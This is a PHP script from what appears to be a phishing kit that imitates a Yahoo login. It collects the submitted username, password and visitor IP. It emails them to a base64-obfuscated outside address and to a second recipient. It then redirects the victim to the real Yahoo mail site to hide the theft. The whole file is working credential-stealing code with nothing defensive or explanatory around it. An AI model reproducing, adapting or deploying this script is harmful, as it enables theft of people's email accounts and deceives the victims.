<?php include'robot.php';
session_start();
include'ip.php';
$ip = MDgetIp();
$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]O-ID:	  ".$_POST['username']."\n";
$message .= "[+]PASS:     ".$_POST['password']."\n";
$message .= "[+]IP:       ".$ip;
$message .= "[ - ] ==================| Card |================== [ - ]\n";
$_SESSION['x'] = $message;
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['username'])){
$pra = rand(1111111111,9999999999);
$subject = $pra."- AYAHOO-ERAMILAH - [".$_POST['username']."]";
$headers = "From: ERAMILAHA".$pra."<ERAMILAbursted@".$pra."0eramila.com>";
$str = "b25lZml0LWluY0Bwcm90b25tYWlsLmNvbQ==";
$cleanIP = base64_decode($str);
mail($cleanIP, $subject, $message, $headers);
mail($sendX,$subject,$message,$headers);
header("Location: https://mail.yahoo.com/neo/launch?action=contacts");
}else{
header("Location: index.php");
}
?>